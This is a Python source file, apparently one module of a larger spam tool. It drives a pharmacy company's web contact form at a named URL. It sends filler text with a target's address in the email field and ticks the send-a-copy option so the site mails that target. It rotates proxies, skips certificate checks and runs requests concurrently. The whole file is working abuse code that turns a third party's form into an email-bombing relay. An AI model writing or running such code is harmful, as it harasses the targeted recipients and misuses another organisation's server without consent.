import requests

from module.spam_abstraction import Spam

url = 'http://herysonpharma.com/contact.php'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://herysonpharma.com',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://herysonpharma.com/contact.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'name': text,
            'email': target,
            'phone': text,
            'subject': text.encode(),
            'message': text,
            'yourself': 'on',
            'Submit': 'Send Email',
        }

        response = requests.post(url, headers=headers, data=data, verify=False, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'herysonpharma'  # 3OxzXy8
    success_message = ''
    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
